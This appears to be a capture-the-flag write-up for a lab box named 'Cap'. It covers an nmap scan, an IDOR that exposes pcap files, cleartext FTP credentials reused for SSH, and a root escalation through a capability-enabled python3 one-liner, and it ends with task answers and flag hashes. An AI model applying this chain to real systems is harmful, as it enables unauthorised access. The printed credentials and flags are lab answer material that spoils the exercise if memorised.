# Cap

## Nmap

```
sudo nmap -sV 10.129.157.186
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-28 22:39 -0400
Nmap scan report for 10.129.157.186
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Webpage

<figure><img src="../../.gitbook/assets/image (1077).png" alt=""><figcaption></figcaption></figure>

Viewing the Security Snapshot, we can see `/data/#` in the URL. Changing that to other numbers lets us view others information, then download the `.pcap` file.\
![](<../../.gitbook/assets/image (1078).png>)

Looking at the `0.pcap` we see cleartext credentials for `nathan`\
![](<../../.gitbook/assets/image (1079).png>)

Trying the user/password with the open SSH service, which works.\
`nathan:Buck3tH4TF0RM3!`\
![](<../../.gitbook/assets/image (1080).png>)

<figure><img src="../../.gitbook/assets/image (1081).png" alt=""><figcaption></figcaption></figure>

Now looking at system services we can abuse.

```
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>

Using the old standard python exploit, we can get root

```
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

<figure><img src="../../.gitbook/assets/image (1083).png" alt=""><figcaption></figcaption></figure>

## Tasks

1. How Many TCP Ports are open? - 3
2. After running a "Security Snapshot", the browser is redirected to a path of the format `/something/id`, where `id` represents the id number of the scan. What is the `something`? - Data
3. Are you able to get to other users' scans? - yes
4. What is the ID of the PCAP file that contains sensative data? - 0
5. Which application layer protocol in the pcap file can the sensetive data be found in? - FTP
6. We've managed to collect nathan's FTP password. On what other service does this password work? - SSH
7. Submit the flag located in the nathan user's home directory. - d99cd846d45e9240429172ae9d19fb39
8. What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges? - /usr/bin/python3.8
9. Submit the flag located in root's home directory. - 315c1122c180fe593ff6a9efc81ebaef
